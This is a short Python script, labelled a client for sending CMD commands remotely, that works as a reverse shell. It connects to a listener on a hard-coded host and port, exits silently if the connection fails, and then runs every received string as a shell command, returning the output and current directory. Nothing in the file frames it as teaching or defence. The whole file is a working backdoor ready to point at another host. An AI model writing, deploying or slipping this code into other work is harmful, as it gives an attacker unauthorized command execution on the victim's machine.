# client.py for sending CMD commands remotely
import os
import subprocess 
import socket 

path = os.path.dirname(os.path.abspath(__file__))
host = '127.0.0.1'
port = 55885
s = socket.socket()
try:
    s.connect((host,port))
except:
    os._exit(0)
while True:
    try:
        data = s.recv(1024)
        if data[:2].decode("utf-8")=='cd': 
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0: 
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # run a command like you would in terminal - just in standard stream
            output_byes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd())+ '> '))
    except:
        break
    
# Using Powershell
# command = 'Get-Process'
# result = subprocess.run(['powershell.exe', command], stdout=subprocess.PIPE)
# print(result.stdout.decode('utf-8'))
